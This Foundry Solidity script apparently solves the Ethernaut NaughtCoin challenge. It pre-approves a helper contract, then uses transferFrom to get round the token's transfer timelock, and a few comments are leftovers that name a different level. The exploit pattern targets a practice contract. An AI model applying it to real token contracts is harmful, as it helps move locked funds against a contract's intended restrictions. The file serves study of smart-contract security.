// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {NaughtCoin} from "../src/NaughtCoin.sol";

contract NaughtCoinScript is Script {
    function run() public {
        uint256 pk = vm.envUint("PK");

        NaughtCoin coin = NaughtCoin(vm.envAddress("NAUGHTCOIN_INSTANCE"));
        address naughtCoinExecutorExecutorAddre = vm.computeCreateAddress(vm.addr(pk), vm.getNonce(vm.addr(pk)) + 1);

        vm.startBroadcast(pk);
        coin.approve(naughtCoinExecutorExecutorAddre, coin.balanceOf(vm.addr(pk)));
        new NaughtCoinExecutor(coin).exploit();
        vm.stopBroadcast();
    }

    // forge script script/GatekeeperTwoScript.s.sol:GatekeeperTwoScript --broadcast
}

contract NaughtCoinExecutor { // validate the gate two
    NaughtCoin coin;

    constructor(NaughtCoin _coin) {
        coin = _coin;
    }

    function exploit() external {
        coin.transferFrom(msg.sender, address(this), coin.balanceOf(msg.sender));
    }
}
